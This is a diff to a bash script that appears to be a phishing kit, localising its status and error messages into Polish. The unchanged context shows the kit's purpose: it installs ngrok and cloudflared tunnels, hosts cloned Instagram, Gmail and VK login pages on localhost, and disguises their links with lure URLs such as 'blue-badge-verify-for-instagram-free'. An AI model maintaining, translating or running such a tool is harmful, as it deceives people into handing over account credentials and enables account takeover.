@@ -188,9 +188,9 @@ download_cloudflared() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok jest aktualnie instalowany."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -210,7 +210,7 @@ install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared jest aktualnie instalowany."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -366,7 +366,7 @@ start_cloudflared() {
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicjowanie... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
@@ -465,7 +465,7 @@ site_instagram() {
 			mask='http://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Zla opcja, Jeszcze raz..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -496,7 +496,7 @@ site_gmail() {
 			mask='http://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Zla opcja, Jeszcze raz..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -522,7 +522,7 @@ site_vk() {
 			mask='http://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Zla opcja, Jeszcze raz..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
